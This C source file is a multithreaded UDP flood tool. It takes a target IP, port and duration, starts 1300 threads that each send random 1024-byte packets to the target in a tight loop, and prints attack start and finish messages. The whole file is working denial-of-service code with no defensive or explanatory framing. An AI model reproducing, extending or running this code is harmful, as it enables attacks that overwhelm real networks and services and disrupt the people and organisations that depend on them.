#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define NUM_THREADS 1300

// Structure to hold parameters for each thread.
struct thread_params {
    char ip[16];
    int port;
    int duration;
};

void generate_payload(char *buffer, int size) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.";
    for (int i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

void *send_payload(void *arg) {
    struct thread_params *params = (struct thread_params *)arg;
    char buf[1024];
    generate_payload(buf, sizeof(buf));

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sockfd, buf, sizeof(buf), 0,
                   (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("\033[1mUsage: %s <IP> <PORT> <DURATION>\033[0m\n", argv[0]);
        return 1;
    }

    struct thread_params params;
    memset(&params, 0, sizeof(params));
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.ip[sizeof(params.ip) - 1] = '\0';
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    printf("\033[36mAttack started on %s:%d for %d seconds\033[0m\n", params.ip, params.port, params.duration);

    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params)) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
